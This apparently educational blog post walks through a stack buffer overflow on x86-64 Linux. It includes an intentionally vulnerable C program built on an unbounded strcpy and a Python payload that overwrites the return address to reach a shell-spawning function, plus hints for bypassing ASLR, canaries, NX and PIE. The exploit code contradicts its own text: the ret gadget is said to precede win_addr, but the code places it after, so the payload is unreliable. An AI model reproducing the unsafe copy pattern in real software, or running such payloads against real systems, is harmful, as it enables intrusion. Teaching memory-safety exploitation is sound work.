Buffer overflows are the oldest class of memory-safety bugs — and still among the most common. This post walks through a classic stack-based overflow on x86-64 Linux, from vulnerable code to a working exploit. No prior exploitation experience required.

The vulnerable program

#include <stdio.h>
#include <string.h>

void greet(char *name) {
    char buf[64];
    strcpy(buf, name);          // no bounds check
    printf("Hello, %s!\n", buf);
}

int main(int argc, char **argv) {
    if (argc != 2) return 1;
    greet(argv[1]);
    return 0;
}

strcpy copies until it hits a null byte — it doesn't care how big buf is. If we pass more than 64 bytes, we start overwriting the stack frame above buf.

The stack layout

On x86-64, the stack grows downward. Inside greet, the layout looks like this (addresses decrease downward): 

  +------------------+  high address
  |  return address  |  ← where greet returns to
  +------------------+
  |  saved RBP       |  ← frame pointer
  +------------------+
  |  buf[63..0]      |  ← our 64-byte buffer
  +------------------+  low address (RSP)

If we write past buf, we overwrite the saved RBP first, then the return address. Control the return address, control the program.

Crafting the exploit

We need 64 bytes of padding + 8 bytes for saved RBP + the address we want to jump to. Let's jump to a win function that spawns a shell: 

def exploit():
    padding = b"A" * 64          # fill buf
    padding += b"B" * 8          # overwrite saved RBP
    padding += p64(win_addr)     # overwrite return address
    padding += p64(ret_gadget)   # stack alignment (16-byte)
    return padding

We add a ret gadget (a single ret instruction) before win_addr because the x86-64 ABI requires the stack to be 16-byte aligned at a call instruction. Without it, movaps inside system() will segfault.

Mitigations and how to bypass them

Modern systems have several mitigations that make this harder:

  • ASLR — randomizes stack/heap/libc addresses. Leak an address first.
  • Stack canary — a random value before the return address. Leak it or brute-force it.
  • NX/DEP — stack is non-executable. Use ROP or ret2libc.
  • PIE — randomizes the binary's base address. Leak a code address.

Each mitigation raises the bar, but none eliminates the underlying bug. The real fix is to use bounds-checked functions (strncpy, snprintf) or a memory-safe language.
